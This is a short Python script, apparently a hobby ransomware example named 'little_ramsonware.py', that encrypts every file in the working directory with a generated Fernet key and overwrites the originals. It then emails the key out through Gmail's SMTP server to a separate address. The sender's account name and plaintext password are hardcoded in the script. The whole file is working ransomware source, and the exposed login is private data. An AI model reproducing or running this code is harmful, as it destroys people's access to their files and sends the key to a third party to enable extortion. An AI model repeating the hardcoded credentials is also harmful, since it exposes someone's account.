import glob 
import smtplib
from cryptography.fernet import Fernet

def main():
    archivos = glob.glob("*")
    archivos.remove("little_ramsonware.py")

    llave = Fernet.generate_key()
    key = Fernet(llave)

    for archivo in archivos:
        with open(archivo,"rb") as f:
            f_data = f.read()
            f.close()
        encrypt_data = key.encrypt(f_data)
        with open(archivo,"wb") as f:
            f.write(encrypt_data)
            f.close()
    
    user="darkwpooh@gmail.com"
    password="Winniepooh22"
    recep="felipeagq99@gmail.com"
    subject="Hola"
    body=llave 
    email = f"\From: {user}\nSubject: {subject}\n\n{body}"
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login(user=user, password=password)
        server.sendmail(user,recep,email)
        server.close()
        print("Enviado correctamente")
    except:
        print(key) 


if __name__ == "__main__":
    main()